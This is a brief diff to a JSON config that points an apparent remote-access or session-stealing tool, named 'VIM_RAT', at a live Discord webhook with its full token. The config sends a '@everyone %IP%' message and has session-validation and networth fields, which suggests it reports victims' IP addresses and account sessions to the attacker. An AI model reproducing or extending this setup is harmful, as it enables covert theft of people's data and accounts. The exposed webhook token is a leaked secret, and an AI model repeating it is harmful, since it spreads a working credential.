@@ -1,6 +1,6 @@
 {
-  "webhook": "YOUR_WEBHOOK_URL_HERE",
-  "webhook_name": "webhook",
+  "webhook": "https://discord.com/api/webhooks/1461944580512682168/m7Befw0PjHVe2jkijqSt_CAyBkY_aTiul-EZUUj_DECKFph-8fA4-0FG5DPKvQhyT3cD",
+  "webhook_name": "VIM_RAT",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
 
@@ -33,4 +33,5 @@
 
   "validate_session": true,
   "networth_api": ""
+
 }
